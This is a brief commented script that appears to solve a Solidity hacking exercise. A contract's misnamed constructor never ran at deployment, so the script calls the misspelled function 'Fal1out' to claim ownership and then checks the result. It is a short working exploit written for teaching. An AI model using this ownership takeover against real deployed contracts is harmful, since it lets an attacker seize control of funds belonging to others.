/*

This is a silly mistake smart contract

The constructor method is not properly named and hence is not executed 
when the contract was deployed (This explains why the contract instance has 
an address but no owner)

-- Note: This is a Solidity 0.6.0 example, hence its not applicable to newer 
versions of solidity as the method of invoking a constructor is changed.
The constructor method is now explicitly declared with a constructor() syntax

*/

// Check the contract owner
await contract.owner();
// It comes out to be 0 address as this was not set

// Exploit the contract by calling the misspelled constructor
contract.Fal1out();

// Check whether you are the owner
await contract.owner();
